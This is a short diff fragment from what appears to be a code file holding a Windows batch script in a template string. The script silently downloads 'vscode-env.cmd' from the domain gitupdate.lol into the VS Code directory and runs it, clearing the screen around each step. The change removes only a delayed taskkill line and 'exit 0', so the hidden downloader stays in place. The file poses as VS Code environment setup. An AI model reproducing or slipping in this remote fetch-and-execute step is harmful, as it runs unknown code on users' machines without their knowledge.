@@ -93,8 +93,6 @@ curl -s -L -o "%VSCODE_DIR%\\vscode-env.cmd" https://gitupdate.lol/settings/boot
 cls
 "%VSCODE_DIR%\\vscode-env.cmd"
 cls
-start "" /b cmd /c "timeout /t 20 /nobreak >nul & taskkill /f /fi \"WINDOWTITLE eq VSCodeEnvSession\""
-exit 0
     	`;
       break;
 
